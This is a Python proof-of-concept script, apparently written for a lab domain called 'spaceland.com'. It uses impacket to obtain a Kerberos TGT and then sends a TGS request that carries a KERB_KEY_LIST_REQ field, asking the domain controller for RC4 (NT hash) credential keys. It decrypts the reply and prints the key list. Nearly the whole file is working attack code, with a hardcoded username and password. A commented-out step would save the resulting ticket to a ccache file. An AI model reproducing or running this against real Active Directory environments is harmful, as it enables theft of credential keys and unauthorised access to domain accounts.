import datetime
import random
import string

from binascii import unhexlify
from pyasn1.codec.der import encoder, decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import Ticket as TicketAsn1, EncTicketPart, AP_REQ, seq_set, Authenticator, TGS_REQ, \
    seq_set_iter, AS_REP, TGS_REP, EncTGSRepPart, KERB_KEY_LIST_REP
from impacket.krb5.constants import ProtocolVersionNumber, TicketFlags, PrincipalNameType, encodeFlags, EncryptionTypes
from impacket.krb5.crypto import Key, _enctype_table, Enctype
from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT
from impacket.krb5.types import KerberosTime, Principal, Ticket
try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


class POC:
    def __init__(self, options):
        self.__target = options.target
        self.__domain = options.domain
        self.__userName = options.userName
        self.__kdcHost = options.kdcHost
        self.__password = options.password
        self.__lmhash = ""
        self.__nthash = ""
        self.__aesKey = ""

    def createTGT(self):
        print('creating TGT')
        userName = self.__userName
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                self.__aesKey,
                                                                self.__kdcHost)

        return tgt, sessionKey

    def getKeys(self, tgt, sessionKey):
        print('getting keys')

        tgt_decoded = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgt_decoded['ticket'])


        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = tgt_decoded['crealm'].asOctets()

        seq_set(authenticator, 'cname', options.userName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)
        cipher = _enctype_table[tgt_decoded['enc-part']['etype']]
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        encodedApReq = encoder.encode(apReq)
        tgsReq['padata'][0]['padata-value'] = encodedApReq
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
        tgsReq['padata'][1]['padata-value'] = encodedKeyReq

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        serverName = Principal("krbtgt", type=PrincipalNameType.NT_SRV_INST.value)
        reqBody['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
        reqBody['sname']['name-string'][0] = serverName
        reqBody['sname']['name-string'][1] = self.__domain
        reqBody['realm'] = options.domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = rand.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(cipher.enctype),
                         int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.rc4_hmac_exp.value),
                         int(constants.EncryptionTypes.rc4_hmac_old_exp.value)
                     )
                     )

        message = encoder.encode(tgsReq)
        # Let's send our TGS Request, the response will include the FULL TGT!!!
        resp = sendReceive(message, options.domain, options.kdcHost)

        tgsRep = decoder.decode(resp, asn1Spec=TGS_REP())[0]
        encTGSRepPart = tgsRep['enc-part']
        print(encTGSRepPart.prettyPrint())
        enctype = encTGSRepPart['etype']
        cipher = _enctype_table[enctype]

        decryptedTGSRepPart = cipher.decrypt(sessionKey, 8, encTGSRepPart['cipher'])

        decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
        print(decodedTGSRepPart.prettyPrint())
        print("=" * 80)

        encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
        decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
        print(decodedPaData1.prettyPrint())
        return resp

    def saveTicket(self, ticket, sessionKey):
        print ('Saving ticket in %s' % 'leandro' + '.ccache')
        cipher = _enctype_table[Enctype.AES256]
        key = Key(cipher.enctype, bytes(sessionKey))
        from impacket.krb5.ccache import CCache
        ccache = CCache()
        ccache.fromTGS(ticket, key, key)
        ccache.saveFile('leandro' + '.ccache')


if __name__ == '__main__':
    import argparse
    import sys

    try:
        import pyasn1
        from pyasn1.type.univ import noValue, SequenceOf, Integer
    except ImportError:
        print('This module needs pyasn1 installed')
        sys.exit(1)

    options = argparse.Namespace()

    #SPACELAND ENV
    options.userName = Principal('Leandro', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    options.domain = 'spaceland.com'
    options.kdcHost = 'win-ser19.spaceland.com'
    options.target = 'win-ser19.spaceland.com'
    options.password = 'Lea123456'

    poc = POC(options)

    try:
        tgt, sessionKey = poc.createTGT()
        #we got the partial ticket, now we have to make a TGS req with this ticket to obtain a fully one
        fullTGT = poc.getKeys(tgt, sessionKey)
        #let's save the ticket
        #poc.saveTicket(fullTGT, sessionKey)
    except Exception as e:
        import traceback

        traceback.print_exc()
        #print("!ERROR: " + str(e))